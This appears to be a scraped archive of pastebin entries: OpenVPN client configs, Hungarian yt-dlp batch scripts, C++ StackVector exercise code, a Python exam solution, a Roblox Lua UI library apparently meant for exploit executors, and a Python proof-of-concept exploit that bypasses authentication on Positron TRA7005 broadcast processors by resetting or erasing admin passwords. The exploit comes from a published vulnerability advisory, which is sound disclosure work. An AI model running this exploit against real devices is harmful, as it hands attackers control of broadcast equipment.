CQCkqr5NgknSRjANBgkqhkiG9w0BAQ0FAAOCAQEAMjkx4HQoLkLVMix6j6HVf8Lr
lKnbDlMx3gYfkD8J5LhTrf8JezB07rSialwiF7lvs3+urvQQdUs5tZCARRDpQANR
b8XzxbDu3oO4eOOxiDPnHutZv04/rN3Y/s3kSrJEwXxnWDLSzn9IsJtFtV+oHwan
ijRI4jaTBAzaqpFzq1Ffm1O1PrFfhwjb4aEyahMXCU8xRavBGKu7EeXZ78lXJVqg
0q3hbTISxRXSa63JgwxZnXcHIyeO4V/bZIcJvIei17xlc7dLDHPdnyQtrD07+AEH
qioNZsFRPJqf8KwmVCEIJq38cM7nSRXrrZ36w9P4sMBRHABQBre2DIqdo9hoeA==
-----END CERTIFICATE-----
</ca>
tls-client
remote-cert-tls server
auth-user-pass
compress lzo
verb 3
auth SHA256
cipher AES-256-CBC
"
xFH5zLpw,Untitled,Netsemfim,Bash,Thursday 11th of April 2024 08:02:46 AM CDT,"client
dev tun
proto udp
remote gru-c03.vpn.wlvpn.com 1194
remote gru-c04.vpn.wlvpn.com 1194
remote gru-c05.vpn.wlvpn.com 1194
remote gru-c01.vpn.wlvpn.com 1194
remote gru-c06.vpn.wlvpn.com 1194
remote gru-c07.vpn.wlvpn.com 1194
remote gru-c08.vpn.wlvpn.com 1194
remote gru-c09.vpn.wlvpn.com 1194
remote gru-c10.vpn.wlvpn.com 1194
remote gru-c11.vpn.wlvpn.com 1194
remote gru-c12.vpn.wlvpn.com 1194
remote gru-c13.vpn.wlvpn.com 1194
remote gru-c02.vpn.wlvpn.com 1194
remote-random
resolv-retry infinite
nobind
persist-key
persist-tun
persist-remote-ip
<ca>
-----BEGIN CERTIFICATE-----
MIIESjCCAzKgAwIBAgIJAKSqvk2CSdJGMA0GCSqGSIb3DQEBDQUAMHUxCzAJBgNV
BAYTAlVTMQwwCgYDVQQIEwNWUE4xDDAKBgNVBAcTA1ZQTjEMMAoGA1UEChMDVlBO
MQwwCgYDVQQLEwNWUE4xDDAKBgNVBAMTA1ZQTjEMMAoGA1UEKRMDVlBOMRIwEAYJ
KoZIhvcNAQkBFgNWUE4wIBcNMjIwNTA5MjA0NTA2WhgPMjA4MjA0MjQyMDQ1MDZa
MHUxCzAJBgNVBAYTAlVTMQwwCgYDVQQIEwNWUE4xDDAKBgNVBAcTA1ZQTjEMMAoG
A1UEChMDVlBOMQwwCgYDVQQLEwNWUE4xDDAKBgNVBAMTA1ZQTjEMMAoGA1UEKRMD
VlBOMRIwEAYJKoZIhvcNAQkBFgNWUE4wggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw
ggEKAoIBAQDJSvYEDPaAcZpeuLqtYykqpy9VNfcg5IsR8FZ/V9vbMLDHT4YUwbbn
xiQ4KJCGj9g5fnxsmmywYjjY7NmK1KKxNWlc0gF6XMZQ90qDHSpREaANb7t47JIl
gKfURSdwSUkIe3WyjRJt91CnEDzxVkwf18U4q0tjmoceLR2teb/BnL7NbtN9Xktx
7Tjq+/Yz0jn8qjjNnlWHqNOjZWsJBHDyChcHk0B1TkPvqVWFYrhnO3jCgjydFbkS
/cBYTDmhfzmPkHRNj2cSLmPS81gG4zF/8aIs7wzwsIc9fQdgGIsONl6wkK+4be9/
CcBjkIlCo2O5+macXeK+xoXR0Z6jniRZAgMBAAGjgdowgdcwDAYDVR0TBAUwAwEB
/zAdBgNVHQ4EFgQUF58B5L6R0n/5TGnCqCrIQHBjNqkwgacGA1UdIwSBnzCBnIAU
F58B5L6R0n/5TGnCqCrIQHBjNqmheaR3MHUxCzAJBgNVBAYTAlVTMQwwCgYDVQQI
EwNWUE4xDDAKBgNVBAcTA1ZQTjEMMAoGA1UEChMDVlBOMQwwCgYDVQQLEwNWUE4x
DDAKBgNVBAMTA1ZQTjEMMAoGA1UEKRMDVlBOMRIwEAYJKoZIhvcNAQkBFgNWUE6C
CQCkqr5NgknSRjANBgkqhkiG9w0BAQ0FAAOCAQEAMjkx4HQoLkLVMix6j6HVf8Lr
lKnbDlMx3gYfkD8J5LhTrf8JezB07rSialwiF7lvs3+urvQQdUs5tZCARRDpQANR
b8XzxbDu3oO4eOOxiDPnHutZv04/rN3Y/s3kSrJEwXxnWDLSzn9IsJtFtV+oHwan
ijRI4jaTBAzaqpFzq1Ffm1O1PrFfhwjb4aEyahMXCU8xRavBGKu7EeXZ78lXJVqg
0q3hbTISxRXSa63JgwxZnXcHIyeO4V/bZIcJvIei17xlc7dLDHPdnyQtrD07+AEH
qioNZsFRPJqf8KwmVCEIJq38cM7nSRXrrZ36w9P4sMBRHABQBre2DIqdo9hoeA==
-----END CERTIFICATE-----
</ca>
tls-client
remote-cert-tls server
auth-user-pass
compress lzo
verb 3
auth SHA256
cipher AES-256-CBC
"
uQcFGU6z,másik példa batch letöltésre,ntamas,Batch,Thursday 11th of April 2024 07:45:58 AM CDT,"@echo off
for /l %%x in (1, 1, 9) do (
	echo yt-dlp -o onistudja020%%x.mp4 ""https://mediaklikk.hu/video/on-is-tudja-2024-02-0%%x-i-adas"" --no-mtime >> lista.bat
)
for /l %%x in (10, 1, 31) do (
	echo yt-dlp -o onistudja02%%x.mp4 ""https://mediaklikk.hu/video/on-is-tudja-2024-02-%%x-i-adas"" --no-mtime >> lista.bat
)"
S0G2BTjN,Спринт 8. Проще и быстрее: std::array. Вариант 2,aleksandrchepinoga18,C++,Thursday 11th of April 2024 07:44:12 AM CDT,"-----------------------------------------------------------------------
main.cpp
-----------------------------------------------------------------------
#include ""log_duration.h""
#include ""my_assert.h""
#include ""stack_vector.h""

#include <iostream>
#include <random>
#include <stdexcept>

using namespace std;

void TestConstruction() {
    StackVector<int, 10> v;
    assert(v.Size() == 0u);
    assert(v.Capacity() == 10u);

    StackVector<int, 8> u(5);
    assert(u.Size() == 5u);
    assert(u.Capacity() == 8u);

    try {
        StackVector<int, 10> u(50);
        cout << ""Expect invalid_argument for too large size""s << endl;
        assert(false);
    } catch (invalid_argument&) {
    } catch (...) {
        cout << ""Expect invalid_argument for too large size""s << endl;
        assert(false);
    }
}

void TestPushBack() {
    StackVector<int, 5> v;
    for (size_t i = 0; i < v.Capacity(); ++i) {
        v.PushBack(i);
    }

    try {
        v.PushBack(0);
        cout << ""Expect overflow_error for PushBack in full vector""s << endl;
        assert(false);
    } catch (overflow_error&) {
    } catch (...) {
        cout << ""Unexpected exception for PushBack in full vector""s << endl;
        assert(false);
    }
}

void TestPopBack() {
    StackVector<int, 5> v;
    for (size_t i = 1; i <= v.Capacity(); ++i) {
        v.PushBack(i);
    }
    for (int i = v.Size(); i > 0; --i) {
        assert(v.PopBack() == i);
    }

    try {
        v.PopBack();
        cout << ""Expect underflow_error for PopBack from empty vector""s << endl;
        assert(false);
    } catch (underflow_error&) {
    } catch (...) {
        cout << ""Unexpected exception for PopBack from empty vector""s << endl;
        assert(false);
    }
}

int main() {
    TestConstruction();
    TestPushBack();
    TestPopBack();

    cerr << ""Running benchmark...""s << endl;
    const size_t max_size = 2500;

    default_random_engine re;
    uniform_int_distribution<int> value_gen(1, max_size);

    vector<vector<int>> test_data(50000);
    for (auto& cur_vec : test_data) {
        cur_vec.resize(value_gen(re));
        for (int& x : cur_vec) {
            x = value_gen(re);
        }
    }

    {
        LOG_DURATION(""vector w/o reserve"");
        for (auto& cur_vec : test_data) {
            vector<int> v;
            for (int x : cur_vec) {
                v.push_back(x);
            }
        }
    }
    {
        LOG_DURATION(""vector with reserve"");
        for (auto& cur_vec : test_data) {
            vector<int> v;
            v.reserve(cur_vec.size());
            for (int x : cur_vec) {
                v.push_back(x);
            }
        }
    }
    {
        LOG_DURATION(""StackVector"");
        for (auto& cur_vec : test_data) {
            StackVector<int, max_size> v;
            for (int x : cur_vec) {
                v.PushBack(x);
            }
        }
    }
    cerr << ""Done""s << endl;
}
-----------------------------------------------------------------------
log_duration.h
-----------------------------------------------------------------------
#pragma once

#include <chrono>
#include <iostream>

#define PROFILE_CONCAT_INTERNAL(X, Y) X##Y
#define PROFILE_CONCAT(X, Y) PROFILE_CONCAT_INTERNAL(X, Y)
#define UNIQUE_VAR_NAME_PROFILE PROFILE_CONCAT(profileGuard, __LINE__)
#define LOG_DURATION(x) LogDuration UNIQUE_VAR_NAME_PROFILE(x)
#define LOG_DURATION_STREAM(x, y) LogDuration UNIQUE_VAR_NAME_PROFILE(x, y)

class LogDuration {
public:

    using Clock = std::chrono::steady_clock;

    LogDuration(const std::string& id, std::ostream& dst_stream = std::cerr)
        : id_(id)
        , dst_stream_(dst_stream) {
    }

    ~LogDuration() {
        using namespace std::chrono;
        using namespace std::literals;

        const auto end_time = Clock::now();
        const auto dur = end_time - start_time_;
        dst_stream_ << id_ << "": ""s << duration_cast<milliseconds>(dur).count() << "" ms""s << std::endl;
    }

private:
    const std::string id_;
    const Clock::time_point start_time_ = Clock::now();
    std::ostream& dst_stream_;
};
-----------------------------------------------------------------------
my_assert.h
-----------------------------------------------------------------------
#pragma once
#include <memory>
#include <string>

namespace detail {

class AssertionFailed final {
public:
    AssertionFailed(std::string message, std::string file, std::string func, unsigned line)
        : message_{std::move(message)}
        , file_{std::move(file)}
        , function_{std::move(func)}
        , line_(line) {
    }

    const std::string& GetMessage() const {
        return message_;
    }

    const std::string& GetFile() const {
        return file_;
    }

    const std::string& GetFunction() const {
        return function_;
    }

    unsigned GetLine() const {
        return line_;
    }

private:
    std::string message_;
    std::string file_;
    std::string function_;
    unsigned line_;
};

inline void AssertImpl(const char* message, char const* file, char const* func, unsigned line) {
    throw AssertionFailed(message, file, func, line);
}

}  // namespace detail

#ifdef assert
#undef assert
#endif

#define assert(expression)   \
    (void) ((!!(expression)) \
            || (::detail::AssertImpl(#expression, __FILE__, __FUNCTION__, static_cast<unsigned>(__LINE__)), 0))

-----------------------------------------------------------------------
stack_vector.h
----------------------------------------------------------------------
#pragma once
 
#include <array>
#include <stdexcept>
 
template <typename T, size_t N>
class StackVector {
public:
    explicit StackVector(size_t a_size = 0){
        if (a_size<= Capacity()) {
            size_ = a_size;
        }else{
            throw std::invalid_argument(""Invalid container size."");    
        }
    }
 
    T& operator[](size_t index){
        return storage_.at(index);
    }
    
    const T& operator[](size_t index) const{
        return storage_.at(index);
    }
 
    typename std::array<T, N>::iterator begin(){
        return storage_.begin();
    }
    
    typename std::array<T, N>::iterator end(){
        return std::next(storage_.begin(), size_);
    }
    
    typename std::array<T, N>::const_iterator begin() const{
        return storage_.begin();
    }
    
    typename std::array<T, N>::const_iterator end() const{
        return std::next(storage_.begin(), size_);
    }
 
    size_t Size() const{
        return size_;
    }
    size_t Capacity() const{
        return storage_.size();
    }
 
    void PushBack(const T& value){
        if(size_!=Capacity()) {
            storage_[size_] = value;
            ++size_;
        }else{
            throw std::overflow_error(""Not enough free space to add a new item."");
        }
    }
    
    T PopBack(){
        if(size_) {
            --size_;
            return storage_[size_];
        }else{
            throw std::underflow_error(""Container is empty."");
        }
    }
private:
    std::array<T, N> storage_;
    size_t size_;
};
"
Yp9xKKUr,batch file a letöltésekhez,ntamas,Batch,Thursday 11th of April 2024 07:42:49 AM CDT,"@echo off
for /l %%x in (1, 1, 33) do (
 echo yt-dlp -o bank%%x.mp4 ""https://tv2play.hu/a_bank/%%x.resz"" --no-mtime >> lista.bat
)"
GMKPNw69,EGE 27,safarislava,Python,Thursday 11th of April 2024 07:27:32 AM CDT,"f = open(""27-170b.txt"")
n, k = map(int, f.readline().split())
a = list(map(int, f.readlines()))

dp = [[0, 0]]
for i in range(0, n - k):
    if dp[len(dp) - 1][1] - 1 > k:
        res = [dp[len(dp) - 1][0] - a[i - 1], dp[len(dp) - 1][1] - 1]
        dp.append(res)
    else:
        maxs = -2e9
        end = -1
        sumr = 0
        for j in range(i, n):
            sumr += a[j]

            if j - i + 1 > k:
                if sumr >= maxs:
                    maxs = sumr
                    end = j
                if sumr < 0:
                    break

        dp.append([maxs, end - i + 1])

print(dp)
print(max(dp))"
ESsBDtYQ,Positron Broadcast Signal Processor TRA7005 v1.20 - Authentication Bypass,FlyFar,Python,Thursday 11th of April 2024 07:17:16 AM CDT,"# Exploit Title: Positron Broadcast Signal Processor TRA7005 v1.20 - Authentication Bypass
# Author: LiquidWorm
# Vendor: Positron srl
# Product web page: https://www.positron.it
#                   https://www.positron.it/prodotti/apparati-broadcast/stereo-multicoder/tra-7005/
# Affected version: 1.20
#                   TRA7K5_REV107
#                   TRA7K5_REV106
#                   TRA7K5_REV104
#                   TRA7K5_REV102
#
# Summary: The TRA7000 series is a set of products dedicated to broadcast, designed to
# guarantee an excellent quality-price ratio in compliance with current regulations and
# intended for individual broadcasters or radio networks. All models in the TRA7000 series
# are fully digital, using only high-quality components such as 24-bit A/D and D/A converters
# and 32-bit DSP. The TRA7005 performs the functions of Stereo Coder, RDS Coder, 5-output
# MPX Distributor, AGC (adjustable) for both analogue and digital audio inputs, Clipper
# for both analogue and digital audio inputs, change-over emergency switching between any
# input with adjustable thresholds and intervention times, both in the switching phase on
# the secondary source and in the return phase to the primary source. Ethernet connection
# with Web-Server (optional) for total control and management of the device. Advanced BYPASS
# system between MPX input and outputs, active on operating and power supply anomalies and
# can also be activated remotely.
#
# Desc: The Positron Broadcast Digital Signal Processor TRA7005 suffers from an authentication
# bypass through a direct and unauthorized access to the password management functionality.
# The vulnerability allows attackers to bypass Digest authentication by manipulating the
# password endpoint _Passwd.html and its payload data to set a user's password to arbitrary
# value or remove it entirely. This grants unauthorized access to protected areas (/user,
# /operator, /admin) of the application without requiring valid credentials, compromising
# the device's system security.
#
# Tested on: Positron Web Server
#
#
# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
#                             @zeroscience
#
#
# Advisory ID: ZSL-2024-5813
# Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2024-5813.php
#
#
# 22.03.2024
#
#


import requests,sys

print(""""""
______________________________________
┏┳┓•      ┏┓            ┓  ┏┓    ┓  • 
 ┃ ┓┏┓┓┏  ┃┃┏┓┏┏┓┏┏┏┓┏┓┏┫  ┣ ┓┏┏┓┃┏┓┓╋
 ┻ ┗┛┗┗┫  ┣┛┗┻┛┛┗┻┛┗┛┛ ┗┻  ┗┛┛┗┣┛┗┗┛┗┗
       ┛                       ┛
                 for
   Positron Digital Signal Processor
             ZSL-2024-5813
______________________________________
"""""")

if len(sys.argv) != 4:
    print(""Usage: python positron.py <ip:port> <user/oper/admin> <erase/new_pwd>"")
    sys.exit(1)

ip = sys.argv[1]
ut = sys.argv[2]
wa = sys.argv[3]

valid_ut = ['user', 'oper', 'admin']
if ut.lower() not in valid_ut:
    print(""Invalid user type! Use 'user', 'oper', or 'admin'."")
    sys.exit(1)

url = f'http://{ip}/_Passwd.html'
did = f'http://{ip}/_Device.html'

try:
    r = requests.get(did)
    if r.status_code == 200 and 'TRA7K5' in r.text:
        print(""Vulnerable processor found!"")
    else:
        print(""Not Vulnerable or not applicable. Exploit exiting."")
        sys.exit(1)
except requests.exceptions.RequestException as e:
    print(f""Error checking device: {e}"")
    sys.exit(1)

headers = {
    'Content-Type'   : 'application/x-www-form-urlencoded',
    'Accept-Language': 'mk-MK,en;q=0.6',
    'Accept-Encoding': 'gzip, deflate',
    'User-Agent'     : 'R-Marina/11.9',
    'Accept'         : '*/*'
}

payload = {}
if wa.lower() == 'erase':
    payload[f'PSW_{ut.capitalize()}'] = 'NONE'
else:
    payload_key = f'PSW_{ut.capitalize()}'
    payload[payload_key] = wa
    #print(payload)

r = requests.post(url, headers=headers, data=payload)
print(r.status_code)
print(r.text)
            "
BB3JXBkx,Eclipse Theme (UI Lib),BloxScript_Hub,Lua,Thursday 11th of April 2024 07:13:31 AM CDT,"local library = {
	flags = {}, 
	items = {}
}

local runservice = game:GetService(""RunService"")
local uis = game:GetService(""UserInputService"")
local tweenservice = game:GetService(""TweenService"")
local textservice = game:GetService(""TextService"")
local coregui = game:GetService(""CoreGui"")
local httpservice = game:GetService(""HttpService"")

local mouse = game:GetService(""Players"").LocalPlayer:GetMouse()

library.theme = {
    fontsize = 17,
    titlesize = 18,
    font = Enum.Font.Code,
    background = ""rbxassetid://0"",
    tilesize = 90,
    cursor = false,
    cursorimg = ""https://t0.rbxcdn.com/42f66da98c40252ee151326a82aab51f"",
    backgroundcolor = Color3.fromRGB(18, 18, 18), -- Dark background (RGB 18, 18, 18)
    tabstextcolor = Color3.fromRGB(200, 200, 200), -- Light text color (RGB 200, 200, 200)
    bordercolor = Color3.fromRGB(40, 40, 40), -- Dark gray border
    accentcolor = Color3.fromRGB(255, 128, 0), -- Orange accent color (RGB 255, 128, 0)
    accentcolor2 = Color3.fromRGB(60, 60, 60), -- Dark secondary accent color
    outlinecolor = Color3.fromRGB(18, 18, 18), -- Dark background outline
    outlinecolor2 = Color3.fromRGB(30, 30, 30), -- Slightly lighter outline
    sectorcolor = Color3.fromRGB(30, 30, 30), -- Dark sector color
    toptextcolor = Color3.fromRGB(200, 200, 200), -- Light text color for top bar
    topheight = 48,
    topcolor = Color3.fromRGB(28, 28, 28), -- Dark top bar background
    topcolor2 = Color3.fromRGB(38, 38, 38), -- Slightly lighter top bar background
    buttoncolor = Color3.fromRGB(50, 50, 50), -- Dark button color
    buttoncolor2 = Color3.fromRGB(40, 40, 40), -- Slightly lighter button color
    itemscolor = Color3.fromRGB(200, 200, 200), -- Light items color
    itemscolor2 = Color3.fromRGB(25, 25, 25) -- Darker secondary items color
}

getgenv().Actyrn7104 = ""Discord: Actyrn#7104, Server: .gg/wDngb2mv4H""

if library.theme.cursor then
	local success = pcall(function()
		library.cursor = Drawing.new(""Image"")
		library.cursor.Data = game:HttpGet(library.theme.cursorimg)
		library.cursor.Size = Vector2.new(64, 64)
		library.cursor.Visible = uis.MouseEnabled
		library.cursor.Rounding = 0
		library.cursor.Position = Vector2.new(mouse.X - 32, mouse.Y + 6)
	end)

	if success and library.cursor then
		uis.InputChanged:Connect(function(input)
			if uis.MouseEnabled and input.UserInputType == Enum.UserInputType.MouseMovement then
				library.cursor.Position = Vector2.new(input.Position.X - 32, input.Position.Y + 7)
			end
		end)

		runservice.RenderStepped:Connect(function()
			uis.OverrideMouseIconBehavior = Enum.OverrideMouseIconBehavior.ForceHide
			library.cursor.Visible = uis.MouseEnabled and (uis.MouseIconEnabled or game:GetService(""GuiService"").MenuIsOpen)
		end)

	elseif not success and library.cursor then
		library.cursor:Remove()
	end
end

function library:CreateWindow(name, size, hidebutton)
	local window = {}
	window.name = name or """"
	window.size = UDim2.fromOffset(size.X, size.Y) or UDim2.fromOffset(500, 600)
	window.hidebutton = hidebutton or Enum.KeyCode.RightShift
	window.theme = library.theme

	local updateevent = Instance.new(""BindableEvent"")
	function window:UpdateTheme(theme)
		updateevent:Fire(theme or library.theme)
		window.theme = (theme or library.theme)
	end

	window.Main = Instance.new(""ScreenGui"", coregui)
	window.Main.Name = name
	window.Main.DisplayOrder = 15

	if syn then
		syn.protect_gui(window.Main)
	end

	local dragging, draginput2, dragstart2, startpos
	uis.InputChanged:Connect(function(input)
		if input == draginput2 and dragging then
			local delta = input.Position - dragstart2
			window.Frame.Position = UDim2.new(startpos.X.Scale, startpos.X.Offset + delta.X, startpos.Y.Scale, startpos.Y.Offset + delta.Y)
		end
	end)

	local dragstart = function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			dragstart2 = input.Position
			startpos = window.Frame.Position

			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end

	local dragend = function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			draginput2 = input
		end
	end

	window.Frame = Instance.new(""TextButton"", window.Main)
	window.Frame.Name = ""main""
	window.Frame.Position = UDim2.fromScale(0.5, 0.5)
	window.Frame.BorderSizePixel = 0
	window.Frame.Size = window.size
	window.Frame.AutoButtonColor = false
	window.Frame.Text = """"
	window.Frame.BackgroundColor3 = window.theme.backgroundcolor
	window.Frame.AnchorPoint = Vector2.new(0.5, 0.5)
	updateevent.Event:Connect(function(theme)
		window.Frame.BackgroundColor3 = theme.backgroundcolor
	end)

	uis.InputBegan:Connect(function(key)
		if key.KeyCode == window.hidebutton then
			window.Frame.Visible = not window.Frame.Visible
		end
	end)

	local function checkIfGuiInFront(Pos)
		local objects = coregui:GetGuiObjectsAtPosition(Pos.X, Pos.Y)
		for i, v in pairs(objects) do
			if not string.find(v:GetFullName(), window.name) then
				table.remove(objects, i)
			end
		end

		return (#objects ~= 0 and objects[1].AbsolutePosition ~= Pos)
	end

	window.BlackOutline = Instance.new(""Frame"", window.Frame)
	window.BlackOutline.Name = ""outline""
	window.BlackOutline.ZIndex = 1
	window.BlackOutline.Size = window.size + UDim2.fromOffset(2, 2)
	window.BlackOutline.BorderSizePixel = 0
	window.BlackOutline.BackgroundColor3 = window.theme.outlinecolor2
	window.BlackOutline.Position = UDim2.fromOffset(- 1, - 1)
	updateevent.Event:Connect(function(theme)
		window.BlackOutline.BackgroundColor3 = theme.outlinecolor2
	end)

	window.Outline = Instance.new(""Frame"", window.Frame)
	window.Outline.Name = ""outline""
	window.Outline.ZIndex = 0
	window.Outline.Size = window.size + UDim2.fromOffset(4, 4)
	window.Outline.BorderSizePixel = 0
	window.Outline.BackgroundColor3 = window.theme.outlinecolor
	window.Outline.Position = UDim2.fromOffset(- 2, - 2)
	updateevent.Event:Connect(function(theme)
		window.Outline.BackgroundColor3 = theme.outlinecolor
	end)

	window.BlackOutline2 = Instance.new(""Frame"", window.Frame)
	window.BlackOutline2.Name = ""outline""
	window.BlackOutline2.ZIndex = - 1
	window.BlackOutline2.Size = window.size + UDim2.fromOffset(6, 6)
	window.BlackOutline2.BorderSizePixel = 0
	window.BlackOutline2.BackgroundColor3 = window.theme.outlinecolor2
	window.BlackOutline2.Position = UDim2.fromOffset(- 3, - 3)
	updateevent.Event:Connect(function(theme)
		window.BlackOutline2.BackgroundColor3 = theme.outlinecolor2
	end)

	window.TopBar = Instance.new(""Frame"", window.Frame)
	window.TopBar.Name = ""top""
	window.TopBar.Size = UDim2.fromOffset(window.size.X.Offset, window.theme.topheight)
	window.TopBar.BorderSizePixel = 0
	window.TopBar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	window.TopBar.InputBegan:Connect(dragstart)
	window.TopBar.InputChanged:Connect(dragend)
	updateevent.Event:Connect(function(theme)
		window.TopBar.Size = UDim2.fromOffset(window.size.X.Offset, theme.topheight)
	end)

	window.TopGradient = Instance.new(""UIGradient"", window.TopBar)
	window.TopGradient.Rotation = 90
	window.TopGradient.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, window.theme.topcolor), ColorSequenceKeypoint.new(1, window.theme.topcolor2)})
	updateevent.Event:Connect(function(theme)
		window.TopGradient.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, theme.topcolor), ColorSequenceKeypoint.new(1, theme.topcolor2)})
	end)

	window.NameLabel = Instance.new(""TextLabel"", window.TopBar)
	window.NameLabel.TextColor3 = window.theme.toptextcolor
	window.NameLabel.Text = window.name
	window.NameLabel.TextXAlignment = Enum.TextXAlignment.Left
	window.NameLabel.Font = window.theme.font
	window.NameLabel.Name = ""title""
	window.NameLabel.Position = UDim2.fromOffset(4, - 2)
	window.NameLabel.BackgroundTransparency = 1
	window.NameLabel.Size = UDim2.fromOffset(190, window.TopBar.AbsoluteSize.Y / 2 - 2)
	window.NameLabel.TextSize = window.theme.titlesize
	updateevent.Event:Connect(function(theme)
		window.NameLabel.TextColor3 = theme.toptextcolor
		window.NameLabel.Font = theme.font
		window.NameLabel.TextSize = theme.titlesize
	end)

	window.Line2 = Instance.new(""Frame"", window.TopBar)
	window.Line2.Name = ""line""
	window.Line2.Position = UDim2.fromOffset(0, window.TopBar.AbsoluteSize.Y / 2.1)
	window.Line2.Size = UDim2.fromOffset(window.size.X.Offset, 1)
	window.Line2.BorderSizePixel = 0
	window.Line2.BackgroundColor3 = window.theme.accentcolor
	updateevent.Event:Connect(function(theme)
		window.Line2.BackgroundColor3 = theme.accentcolor
	end)

	window.TabList = Instance.new(""Frame"", window.TopBar)
	window.TabList.Name = ""tablist""
	window.TabList.BackgroundTransparency = 1
	window.TabList.Position = UDim2.fromOffset(0, window.TopBar.AbsoluteSize.Y / 2 + 1)
	window.TabList.Size = UDim2.fromOffset(window.size.X.Offset, window.TopBar.AbsoluteSize.Y / 2)
	window.TabList.BorderSizePixel = 0
	window.TabList.BackgroundColor3 = Color3.fromRGB(255, 255, 255)

	window.TabList.InputBegan:Connect(dragstart)
	window.TabList.InputChanged:Connect(dragend)

	window.BlackLine = Instance.new(""Frame"", window.Frame)
	window.BlackLine.Name = ""blackline""
	window.BlackLine.Size = UDim2.fromOffset(window.size.X.Offset, 1)
	window.BlackLine.BorderSizePixel = 0
	window.BlackLine.ZIndex = 9
	window.BlackLine.BackgroundColor3 = window.theme.outlinecolor2
	window.BlackLine.Position = UDim2.fromOffset(0, window.TopBar.AbsoluteSize.Y)
	updateevent.Event:Connect(function(theme)
		window.BlackLine.BackgroundColor3 = theme.outlinecolor2
	end)

	window.BackgroundImage = Instance.new(""ImageLabel"", window.Frame)
	window.BackgroundImage.Name = ""background""
	window.BackgroundImage.BorderSizePixel = 0
	window.BackgroundImage.ScaleType = Enum.ScaleType.Tile
	window.BackgroundImage.Position = window.BlackLine.Position + UDim2.fromOffset(0, 1)
	window.BackgroundImage.Size = UDim2.fromOffset(window.size.X.Offset, window.size.Y.Offset - window.TopBar.AbsoluteSize.Y - 1)
	window.BackgroundImage.Image = window.theme.background or """"
	window.BackgroundImage.ImageTransparency = window.BackgroundImage.Image ~= """" and 0 or 1
	window.BackgroundImage.ImageColor3 = Color3.new()
	window.BackgroundImage.BackgroundColor3 = window.theme.backgroundcolor
	window.BackgroundImage.TileSize = UDim2.new(0, window.theme.tilesize, 0, window.theme.tilesize)
	updateevent.Event:Connect(function(theme)
		window.BackgroundImage.Image = theme.background or """"
		window.BackgroundImage.ImageTransparency = window.BackgroundImage.Image ~= """" and 0 or 1
		window.BackgroundImage.BackgroundColor3 = theme.backgroundcolor
		window.BackgroundImage.TileSize = UDim2.new(0, theme.tilesize, 0, theme.tilesize)
	end)

	window.Line = Instance.new(""Frame"", window.Frame)
	window.Line.Name = ""line""
	window.Line.Position = UDim2.fromOffset(0, 0)
	window.Line.Size = UDim2.fromOffset(60, 1)
	window.Line.BorderSizePixel = 0
	window.Line.BackgroundColor3 = window.theme.accentcolor
	updateevent.Event:Connect(function(theme)
		window.Line.BackgroundColor3 = theme.accentcolor
	end)

	window.ListLayout = Instance.new(""UIListLayout"", window.TabList)
	window.ListLayout.FillDirection = Enum.FillDirection.Horizontal
	window.ListLayout.SortOrder = Enum.SortOrder.LayoutOrder

	window.OpenedColorPickers = {}
	window.Tabs = {}

	function window:CreateTab(name)
		local tab = {}
		tab.name = name or """"

		local size = textservice:GetTextSize(tab.name, window.theme.fontsize, window.theme.font, Vector2.new(200, 300))

		tab.TabButton = Instance.new(""TextButton"", window.TabList)
		tab.TabButton.TextColor3 = window.theme.tabstextcolor
		tab.TabButton.Text = tab.name
		tab.TabButton.AutoButtonColor = false
		tab.TabButton.Font = window.theme.font
		tab.TabButton.TextYAlignment = Enum.TextYAlignment.Center
		tab.TabButton.BackgroundTransparency = 1
		tab.TabButton.BorderSizePixel = 0
		tab.TabButton.Size = UDim2.fromOffset(size.X + 15, window.TabList.AbsoluteSize.Y - 1)
		tab.TabButton.Name = tab.name
		tab.TabButton.TextSize = window.theme.fontsize
		updateevent.Event:Connect(function(theme)
			local size = textservice:GetTextSize(tab.name, theme.fontsize, theme.font, Vector2.new(200, 300))
			tab.TabButton.TextColor3 = tab.TabButton.Name == ""SelectedTab"" and theme.accentcolor or theme.tabstextcolor
			tab.TabButton.Font = theme.font
			tab.TabButton.Size = UDim2.fromOffset(size.X + 15, window.TabList.AbsoluteSize.Y - 1)
			tab.TabButton.TextSize = theme.fontsize
		end)

		tab.Left = Instance.new(""ScrollingFrame"", window.Frame)
		tab.Left.Name = ""leftside""
		tab.Left.BorderSizePixel = 0
		tab.Left.Size = UDim2.fromOffset(window.size.X.Offset / 2, window.size.Y.Offset - (window.TopBar.AbsoluteSize.Y + 1))
		tab.Left.BackgroundTransparency = 1
		tab.Left.Visible = false
		tab.Left.ScrollBarThickness = 0
		tab.Left.ScrollingDirection = ""Y""
		tab.Left.Position = window.BlackLine.Position + UDim2.fromOffset(0, 1)

		tab.LeftListLayout = Instance.new(""UIListLayout"", tab.Left)
		tab.LeftListLayout.FillDirection = Enum.FillDirection.Vertical
		tab.LeftListLayout.SortOrder = Enum.SortOrder.LayoutOrder
		tab.LeftListLayout.Padding = UDim.new(0, 12)

		tab.LeftListPadding = Instance.new(""UIPadding"", tab.Left)
		tab.LeftListPadding.PaddingTop = UDim.new(0, 12)
		tab.LeftListPadding.PaddingLeft = UDim.new(0, 12)
		tab.LeftListPadding.PaddingRight = UDim.new(0, 12)

		tab.Right = Instance.new(""ScrollingFrame"", window.Frame)
		tab.Right.Name = ""rightside""
		tab.Right.ScrollBarThickness = 0
		tab.Right.ScrollingDirection = ""Y""
		tab.Right.Visible = false
		tab.Right.BorderSizePixel = 0
		tab.Right.Size = UDim2.fromOffset(window.size.X.Offset / 2, window.size.Y.Offset - (window.TopBar.AbsoluteSize.Y + 1))
		tab.Right.BackgroundTransparency = 1
		tab.Right.Position = tab.Left.Position + UDim2.fromOffset(tab.Left.AbsoluteSize.X, 0)

		tab.RightListLayout = Instance.new(""UIListLayout"", tab.Right)
		tab.RightListLayout.FillDirection = Enum.FillDirection.Vertical
		tab.RightListLayout.SortOrder = Enum.SortOrder.LayoutOrder
